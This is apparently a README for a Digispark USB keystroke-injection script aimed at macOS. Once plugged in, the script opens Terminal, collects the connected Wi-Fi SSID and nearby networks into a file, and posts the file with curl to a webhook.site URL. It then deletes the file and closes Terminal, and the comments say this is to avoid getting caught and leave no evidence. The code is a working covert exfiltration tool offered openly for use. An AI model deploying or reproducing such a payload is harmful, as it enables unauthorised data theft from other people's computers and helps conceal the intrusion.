# Wi-Fi Name

#### This script extracts the Wi-Fi SSID the host is connected to and pushes that and the local wifi networks to an online website.

### Code

```c
#include "DigiKeyboard.h"
#define MOD_CMD_LEFT 0x00000008 //marks the keyboard location for the Command key
boolean hack = true;

void setup() {
  // put your setup code here, to run once:
}

void loop() {
  // put your main code here, to run repeatedly:
  if (hack == true){
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_CMD_LEFT); //Space + Command Keys
    DigiKeyboard.delay(500); //5 milisecond delay
    DigiKeyboard.print("Terminal"); //Opens the Terminal
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
    DigiKeyboard.delay(500);
    DigiKeyboard.print("cd /tmp"); //Goes to the Temporary Directory
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(300);
    DigiKeyboard.print("echo 'This computers connected SSID is:' >> wifi.txt"); //Goes to the Temporary Directory
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(300);
    DigiKeyboard.print("/Sy*/L*/Priv*/Apple8*/V*/C*/R*/airport -I | awk '/ SSID:/ {print $2}' >> wifi.txt"); //https://apple.stackexchange.com/a/176703
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(300);
    DigiKeyboard.print("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s >> wifi.txt"); //Uses the Apple 80211 Framework to get the local Wi-Fi netoworks
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5000);
    DigiKeyboard.print("curl -X POST -F data=@wifi.txt https://webhook.site/"); //Uses curl to export; Enter your own webhook.site here
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(10000); //10 seconds in case of wifi bottleneck
    DigiKeyboard.print("rm wifi.txt");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.sendKeyStroke(KEY_Q, MOD_CMD_LEFT); //Command + Q; To close the terminal to avoid getting caught.
    hack = false; //Changes the boolean to false
  }
}
```

### Notes

This code can be modified at line 30 to push the file to another website using the POST feature of curl. This also makes a clean exit on macOS, by deleting the file and exiting the terminal so there is no hard evidence.

